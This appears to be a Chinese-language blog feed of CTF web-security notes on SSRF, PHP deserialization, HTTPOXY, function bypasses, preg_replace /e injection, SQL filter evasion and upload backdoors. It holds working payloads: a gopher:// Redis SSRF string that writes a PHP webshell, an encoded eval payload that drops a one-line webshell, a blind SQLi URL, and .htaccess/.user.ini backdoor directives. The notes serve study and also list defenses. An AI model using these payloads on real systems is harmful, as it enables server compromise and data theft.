<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//ip:port/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></span><br><span class="line">ip port shell.php</span><br></pre></td></tr></table></figure>

<p><strong>同时 <code>file_get_contents()</code>、<code>fopen()</code>、<code>fsocksopen()</code> 均可能造成SSRF漏洞</strong></p>
<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者利用ssrf可以实现的攻击主要有5种：</p>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等。</p>
<p>常用的利用思路：</p>
<p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p>
<p>1.内网探测: 内网主机信息收集</p>
<p>2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)</p>
<p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p>
<p>4.Payload Result: 返回相应Payload的执行信息</p>
<h3 id="常见的存在漏洞的参数："><a href="#常见的存在漏洞的参数：" class="headerlink" title="常见的存在漏洞的参数："></a>常见的存在漏洞的参数：</h3><p>share、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p>
<p>可以结合google语法及上述关键字进行搜索验证。</p>
<h3 id="常见的容易出问题的函数："><a href="#常见的容易出问题的函数：" class="headerlink" title="常见的容易出问题的函数："></a>常见的容易出问题的函数：</h3><p>PHP : file_get_contents()、fsockopen()、curl_exec()</p>
<p>JAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、排除法</p>
<p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p>
<p>如：<a href="https://link.jianshu.com?t=http://www.douban.com/" target="_blank" rel="noopener">http://www.douban.com/</a>***/service?image=<a href="https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png</a></p>
<p><strong>排除法一：</strong></p>
<p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p>
<p><strong>排除法二：</strong></p>
<p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p>
<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ul>
<li><p>禁用不需要的协议，仅仅允许http和https请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p>
</li>
<li><p>服务端需要认证交互，禁止非正常用户访问服务；</p>
</li>
<li><p>过滤输入信息，永远不要相信用户的输入，判断用户的输入是否是一个合理的URL地址</p>
</li>
<li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法，如果web应用是去获取某一种类型的文件。那么在把返* 回结果展示给用户之前先验证返回的信息是否符合标准。</p>
</li>
<li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
</li>
<li><p>禁止30x跳转</p>
</li>
<li><p>设置URL白名单或限制内网IP</p>
</li>
</ul>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><blockquote>
<p>绕过url后面拼接</p>
<p> 通过在URL后加 “?a=(GET赋值给一个参数)” 或 “#(锚点)” 来让其失效 </p>
</blockquote>
<h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p> 这是一个php内置的类，当__call方法被触发后，它可以发送HTTP和HTTPS请求。该类的构造函数如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</span><br></pre></td></tr></table></figure>

<p>第一个参数是用来指明是否是wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。<br>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url</p>
<p> SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。<br>简单的用法 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(location&apos;=&gt;&apos;http://example.com:2333&apos;,&apos;uri&apos;=&gt;&apos;123&apos;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2020/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html" target="_blank" rel="noopener">CTF PHP反序列化</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">CTF PHP反序列化</a><br><a href="https://www.freebuf.com/articles/web/221213.html" target="_blank" rel="noopener">PHP反序列化漏洞入门</a></p><h2 id="php-反-序列化常见的函数"><a href="#php-反-序列化常见的函数" class="headerlink" title="php(反)序列化常见的函数"></a>php(反)序列化常见的函数</h2><blockquote>
<p>Serialize、Unserialize、json_encode、json_decode。 </p>
</blockquote><h2 id="php对象常见的魔幻函数"><a href="#php对象常见的魔幻函数" class="headerlink" title="php对象常见的魔幻函数"></a>php对象常见的魔幻函数</h2><a id="more"></a>

<ul>
<li>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</li>
<li>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</li>
<li>__toString：当对象被当做一个字符串使用时调用。</li>
<li>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</li>
<li>__wakeup:反序列化恢复对象之前调用该方法</li>
<li>__call:当调用对象中不存在的方法会自动调用该方法。</li>
<li>__get:在调用私有属性的时候会自动执行</li>
</ul>
<h2 id="serialize-hander处理session方式不同导致session注入"><a href="#serialize-hander处理session方式不同导致session注入" class="headerlink" title="serialize_hander处理session方式不同导致session注入"></a>serialize_hander处理session方式不同导致session注入</h2><p>简单看：<br>serialize_handler=php<br>解释：</p>
<p>这样的方式，可以指定php序列化引擎,而不同引擎存储的方式也不同<br>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。<br>在php.ini中存在三项配置项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.save_path=&quot;&quot;   --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ini_set(‘session.serialize_handler’, ‘php’);</p>
</blockquote>
<p>session.serialize_handler存在以下几种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</span><br><span class="line">php 键名+竖线（|）+经过serialize()函数处理过的值</span><br><span class="line">php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</span><br></pre></td></tr></table></figure>

<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。<br>本题中，我们利用的是<strong>session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞</strong><br>例如传入$_SESSION[‘name’]=’|O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}’; 序列化引擎使用的是php_serialize，那么储存的session文件为<br>a:1:{s:4:”name”;s:5:”|O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}”;}</p>
<p>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:”name”;s:5:”当作键名，而把O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p>
<h2 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar://反序列化"></a>phar://反序列化</h2><p><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">PHAR反序列化拓展操作总结</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>常见源码泄露</title>
    <url>/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/NPFS/p/12746349.html" target="_blank" rel="noopener">WEB源码泄露</a> </p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>HTTPOXY漏洞</title>
    <url>/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">HTTPOXY漏洞</a></p><p> Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响 </p><table>
<thead>
<tr>
<th align="center">Language</th>
<th align="center">Environment</th>
<th align="center">HTTP client</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PHP</td>
<td align="center">php-fpm mod_php</td>
<td align="center">Guzzle 4+ Artax</td>
</tr>
<tr>
<td align="center">Python</td>
<td align="center">wsgiref.handlers.CGIHandler twisted.web.twcgi.CGIScript</td>
<td align="center">requests</td>
</tr>
<tr>
<td align="center">Go</td>
<td align="center">net/http/cgi</td>
<td align="center">net/http</td>
</tr>
</tbody></table><a id="more"></a>


<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><blockquote>
<p>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上HTTP_ 前缀， 注册为环境变量, 所以如果你在Header中发送一个Proxy:xxxxxx, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“HTTP_PROXY”)就变成可被控制的了. 那么如果你的所有类似的请求， 都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了… </p>
</blockquote>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote>
<ul>
<li>代码以cgi模式运行，其中使用环境变量<code>HTTP_PROXY</code></li>
<li>信任 HTTP 客户端<code>HTTP_PROXY</code>并将其配置为代理</li>
<li>在请求处理程序中使用的该客户端发出HTTP（与HTTPS相对）请求</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>MD5绕过</title>
    <url>/2020/03/17/MD5%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>比较md5加密后的值是否为0，可以把value变成数组可以绕过</p><blockquote>
<p>因为md5加密一个数组值为null，而null==0</p>
</blockquote>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>php常用函数</title>
    <url>/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h2><blockquote>
<p><code>exif_imagetype()</code>函数判断是不是图片，这个很好绕过，在文件头添加图片头就可以了，例如<code>gif</code>的文件头<code>GIF89a</code> </p>
</blockquote><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><blockquote>
<p>列出 参数目录 中的文件和目录</p>
</blockquote><a id="more"></a>

<h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><blockquote>
<p>在指定的预定义字符前添加反斜杠。这些预定义字符是：</p>
<ul>
<li>单引号 (‘)</li>
<li>双引号 (“)</li>
<li>反斜杠 ()</li>
<li>NULL</li>
</ul>
</blockquote>
<h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><blockquote>
<p>用数组即可 </p>
</blockquote>
<h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h2><blockquote>
<p>二次编码绕过</p>
</blockquote>
<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><blockquote>
<p>ereg()函数匹配数组的时候会返回null </p>
<p>用%00来绕过ereg()变量 </p>
</blockquote>
<h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><blockquote>
<p>strpos()函数和ereg()函数一样也具有数组绕过漏洞 </p>
</blockquote>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><blockquote>
<p>is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较 </p>
</blockquote>
<h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><blockquote>
<p>sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p>
</blockquote>
<h2 id="curl-inti"><a href="#curl-inti" class="headerlink" title="curl_inti()"></a>curl_inti()</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用 </span><br><span class="line">curl_setopt — 为给定的cURL会话句柄设置一个选项。</span><br><span class="line">        说明：</span><br><span class="line">          bool curl_setopt ( resource $ch , int $option , mixed $value )</span><br><span class="line">        参数:</span><br><span class="line">          ch：由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">          option：需要设置的CURLOPT_XXX选项。</span><br><span class="line">          value：将设置在option选项上的值。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个bool类型的值：</span><br><span class="line">            CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个string类型的值：</span><br><span class="line">            CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            ###################</span><br><span class="line">            文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流</span><br><span class="line">curl_exec ：执行 cURL 会话</span><br><span class="line">curl_getinfo — 获取一个cURL连接资源句柄的信息</span><br><span class="line">                说明：</span><br><span class="line">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )获取最后一次传输的相关信息。</span><br><span class="line">                参数：</span><br><span class="line">                      ch 由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">                      opt：这个参数可能是以下常量之一:</span><br><span class="line">                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码</span><br><span class="line">cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。</span><br><span class="line">PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</span><br><span class="line">libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</span><br><span class="line">PHP中使用cURL实现Get和Post请求的方法</span><br><span class="line">这些函数在PHP 4.0.2中被引入。</span><br></pre></td></tr></table></figure>

<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</p>
<p><strong>preg_replace函数原型：</strong></p>
<p>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [int limit])</p>
<p><strong>特别说明：</strong> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace (&quot;/(&lt;/?)(w+)([^&gt;]*&gt;)/e&quot;,</span><br><span class="line">&quot;\1.strtoupper(\2).\3&quot;,</span><br><span class="line">$html_body);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这将使输入字符串中的所有 HTML 标记变成大写。</p>
<p>安全威胁分析： 通常subject参数是由客户端产生的，客户端可能会构造恶意的代码，例如：</p>
<p>复制代码 代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 如果我们提交下面的代码会怎么样呢？ ?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 密文对应的明文是：fputs(fopen(data/a.php,w),<?php eval($_POST[cmd])?>); 执行的结果是在/data/目录下生成一个一句话木马文件 a.php。</p>
<p>再来一个有难度的例子：</p>
<p>复制代码 代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>提交 ?h=[php]phpinfo()[/php]，phpinfo()会被执行吗？ 肯定不会。因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了。 有没有办法让它执行呢？</p>
<p>当然有。在这里我们如果提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行。为什么呢？ 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。</p>
<p>在这里我们需要通过{${}}构造出了一个特殊的变量，’test(“{${phpinfo()}}”)’，达到让函数被执行的效果（${phpinfo()}会被解释执行）。 可以先做如下测试：</p>
<p>复制代码 代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>phpinfo会被成功执行了。</p>
<p>如何防范这种漏洞呢？ 将’test(“\1”)’ 修改为”test(‘\1’)”，这样‘${phpinfo()}’就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。</p>
<blockquote>
<p>函数的第一个和第三个参数都是我们可以控制 </p>
<p>function complex($re, $str) {<br>   return preg_replace(‘/(‘ . $re . ‘)/ei’,’strtolower(“\1”)’,$str);<br>}</p>
<p>foreach($_GET as $re =&gt; $str) {<br>   echo complex($re, $str). “\n”;<br>}</p>
</blockquote>
<p> 官方 <strong>payload</strong> 为： <strong>/?.*={${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>/?.*</strong> ，值为 <strong>{${phpinfo()}}</strong>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原先的语句： preg_replace(&apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value);</span><br><span class="line">变成了语句： preg_replace(&apos;/(.*)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p> 用来执行函数 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function fun($a)&#123;</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(fun, 12);</span><br><span class="line"></span><br><span class="line">?&gt;      \\outcome：12</span><br></pre></td></tr></table></figure>

<p> 但如果传入的参数，是一个数组，且数组的第一个值是一个类的名字，或一个对象，那么，就会把数组的第二个值，当做方法，然后执行。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class fun&#123;</span><br><span class="line">    function __call($a,$b)&#123;  \\当调用的方法不存在时，执行</span><br><span class="line">        echo 11;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new fun();</span><br><span class="line">call_user_func(array($a,&quot;aaaas&quot;));</span><br><span class="line"></span><br><span class="line">?&gt;   \\outcome：11</span><br></pre></td></tr></table></figure>

<h2 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h2><p>basename在处理多比特编码的字符串时会出现一些问题（比如中文，百度这个函数的时候全是说获取中文的问题），那么使用一个超出ascii码范围的字符就可以绕过 </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>过滤绕过</title>
    <url>/2020/03/17/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><p>注释绕过空格</p><blockquote>
<p>在MySQL中，用/**/来标记注释的内容。比如SQL查询：<br>select user() from dual<br>我们用注释替换空格，就可以变成：<br>select/**/user()/**/from/**/dual</p>
</blockquote><a id="more"></a>

<p>括号绕过空格 </p>
<blockquote>
<p>空格被过滤，但括号没有被过滤，可通过括号绕过。<br>我的经验是，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>括号绕过空格的方法，在time based盲注中，是屡试不爽的。<br>举例说明，我们有这样的一条SQL查询：<br>select user() from dual where 1=1 and 2=2<br>观察到user()可以算值，那么user()两边要加括号，变成：<br>select(user())from dual where 1=1 and 2=2;<br>继续，1=1和2=2可以算值，也加括号，去空格，变成：<br>select(user())from dual where(1=1)and(2=2)</p>
<p><a href="http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109" target="_blank" rel="noopener">http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109</a>))<br>这条语句是猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟。它：</p>
<p>1) 既没有用到逗号、大小于符号<br>2) 也没有使用空格</p>
</blockquote>
<p>可尝试Tab替代空格</p>
<h4 id="绕过特殊字符过滤"><a href="#绕过特殊字符过滤" class="headerlink" title="绕过特殊字符过滤"></a>绕过特殊字符过滤</h4><blockquote>
<p>可以用chr()函数绕过</p>
</blockquote>
<h4 id="被过滤"><a href="#被过滤" class="headerlink" title="-- 被过滤"></a>-- 被过滤</h4><blockquote>
<p>用# </p>
</blockquote>
<h4 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h4><p>用%00</p>
<blockquote>
<p>例如:uni%00on </p>
</blockquote>
<h4 id="file-被过滤"><a href="#file-被过滤" class="headerlink" title="file://被过滤"></a>file://被过滤</h4><blockquote>
<p><code>file：/</code>、<code>file:&lt;空格&gt;///</code> </p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/03/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果</p><p>在.user.ini中可以识别PHP_INI_PERDIR和PHP_INI_USER模式的INI设置<br>关于PHP_INI_*一共有四种：</p><a id="more"></a>

<blockquote>
<p>PHP_INI_USER 可在用户脚本以及.user.ini中设定</p>
</blockquote>
<blockquote>
<p>PHP_INI_PERDIR 可在php.ini，.htaccess或httpd.conf中设定</p>
</blockquote>
<blockquote>
<p>PHP_INI_SYSTEM 可在php.ini或httpd.conf中设定</p>
</blockquote>
<blockquote>
<p>PHP_INI_ALL 可在任何地方设定</p>
</blockquote>
<p>auto_prepend_file</p>
<p>该配置项会让php文件在执行前先包含一个指定的文件，通过这个配置项，我们就可以来隐藏自己的后门</p>
<p>.user.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure>

<p>.user.ini利用条件</p>
<blockquote>
<p>服务器脚本语言为PHP</p>
<p>服务器使用CGI／FastCGI模式<br>上传目录下要有可执行的php文件<br>从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache</p>
<p>但仔细推敲我们就会感到“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p>
<p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，当对上传时的路径没有检测../时，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini</p>
</blockquote>
<p><a href="https://www.cnblogs.com/anbuxuan/p/11867129.html" target="_blank" rel="noopener">Apache中.htaccess文件利用的总结与新思路拓展</a></p>
<h2 id="htaccess文件利用"><a href="#htaccess文件利用" class="headerlink" title=".htaccess文件利用"></a>.htaccess文件利用</h2><h3 id="将特定文件作为php解析，用作后门。"><a href="#将特定文件作为php解析，用作后门。" class="headerlink" title="将特定文件作为php解析，用作后门。"></a>将特定文件作为php解析，用作后门。</h3><p>Module模式下写法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.jpg&quot;&gt;    SetHandler application/x-httpd-php  &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>甚至可以将 .htaccess本身作为php来解析，里面编写一句话。这块网络上相关资料很多。</p>
<h3 id="PHP环境下使用-auto-prepend-file-或-auto-append-file-创建后门"><a href="#PHP环境下使用-auto-prepend-file-或-auto-append-file-创建后门" class="headerlink" title="PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门"></a>PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门</h3><p>通过配置auto_append_file或auto_prepend_file可以向所有php文件中的开头或尾部插入指定的文件的内容。</p>
<p>在. htaccess中的写入如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;</span><br><span class="line">php_value auto_append_file &quot;/home/fdipzone/footer.php&quot;</span><br></pre></td></tr></table></figure>

<p>可以包含自己</p>
